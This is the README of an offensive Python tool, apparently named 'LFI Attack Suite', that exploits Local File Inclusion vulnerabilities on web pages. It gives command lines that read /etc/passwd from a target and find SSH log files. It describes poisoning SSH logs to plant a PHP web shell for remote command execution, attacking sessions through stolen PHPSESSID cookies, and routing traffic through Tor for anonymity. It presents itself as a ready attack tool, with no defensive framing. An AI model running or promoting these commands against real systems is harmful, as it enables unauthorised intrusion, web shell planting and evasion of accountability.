# LFI Attack Suite

A powerful Python script designed to exploit Local File Inclusion (LFI) vulnerabilities using GET or POST requests. This tool also includes SSH log poisoning for privilege escalation and optional Tor integration for anonymity.

# Features

Exploit LFI vulnerabilities via GET or POST requests

Automatic detection of SSH log files

SSH log poisoning for potential remote command execution

Support for authenticated LFI exploitation via session cookies

Tor integration for anonymized requests

Requirements

Python 3.11+

requests library (pip install requests)

paramiko library (pip install paramiko)

Tor (must be running on port 9050)

Usage:

# Basic LFI Exploitation

# POST request (default)

python lfi.py http://example.com/vuln_page.php param /etc/passwd POST

# GET request

python lfi.py http://example.com/vuln_page.php param /etc/passwd GET

# Using Tor for Anonymized Requests

Ensure that the Tor service is running on your system, then use the --tor flag:

python lfi.py http://example.com/vuln_page.php param /etc/passwd POST --tor

# Detecting SSH Log Files

python lfi.py http://example.com/vuln_page.php param dummy_payload POST --log-file

# SSH Log Poisoning

Attempts to inject a PHP web shell into the SSH logs:

python lfi.py http://example.com/vuln_page.php param dummy_payload POST --ssh

# Exploiting Authenticated LFI (Using PHPSESSID)

python lfi.py http://example.com/vuln_page.php param /etc/passwd POST --cookie <SESSION_ID>
